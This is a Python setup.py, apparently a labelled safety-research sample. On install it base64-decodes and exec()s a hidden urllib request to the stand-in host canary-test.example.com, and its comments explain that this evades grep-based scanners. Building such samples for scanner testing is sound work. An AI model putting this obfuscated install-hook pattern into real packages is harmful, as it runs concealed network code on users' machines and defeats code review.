"""
SAFETY RESEARCH PACKAGE — NOT REAL MALWARE.
Technique: obfuscated payload — malicious code is base64-encoded so that
naive grep-based scanning for "urllib", "urlopen", etc. does not find it.
Sink: canary-test.example.com (fake).

To inspect the payload:
    python3 -c "import base64; print(base64.b64decode(_BLOB).decode())"
"""
import base64
from setuptools import setup

# Pre-encoded payload.  Decodes to a urllib GET against the canary sink.
# In real malware this constant would be the ONLY thing visible in the source.
_BLOB = (
    "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnRyeToKICAgIHVybGxpYi5yZXF1ZXN0LnVybG9w"
    "ZW4oCiAgICAgICAgImh0dHA6Ly9jYW5hcnktdGVzdC5leGFtcGxlLmNvbS9iNjQiLAog"
    "ICAgICAgIHRpbWVvdXQ9NSwKICAgICkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHBhc3MK"
)

try:
    exec(base64.b64decode(_BLOB).decode())   # noqa: S102
except Exception:
    pass

setup(
    name="canary-base64-blob",
    version="1.0.0",
    description="[CORPUS] Base64-obfuscated callback on install — safety research package",
    packages=["canary_base64_blob"],
)
